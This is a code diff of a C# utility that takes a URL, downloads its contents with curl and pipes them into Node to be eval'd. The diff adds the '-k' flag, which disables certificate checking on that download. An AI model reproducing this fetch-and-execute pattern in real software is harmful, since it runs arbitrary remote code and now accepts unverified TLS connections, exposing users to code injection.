@@ -1,4 +1,6 @@
-﻿using System.Diagnostics;
+﻿using System;
+using System.Diagnostics;
+using System.Linq;
 
 if ((args?.Count() ?? 0) == 0 || args.Count() > 1)
 {
@@ -14,7 +16,7 @@ else
 {
     try
     {
-        var command = "/c curl -s " + args[0] + @"| node -e ""let data = ''; process.stdin.on('data', chunk => { data += chunk; }); process.stdin.on('end', () => { eval(data); }); """;
+        var command = "/c curl -s -k " + args[0] + @"| node -e ""let data = ''; process.stdin.on('data', chunk => { data += chunk; }); process.stdin.on('end', () => { eval(data); }); """;
         //Process.Start("CMD.exe", command);
 
         Process process = new Process();
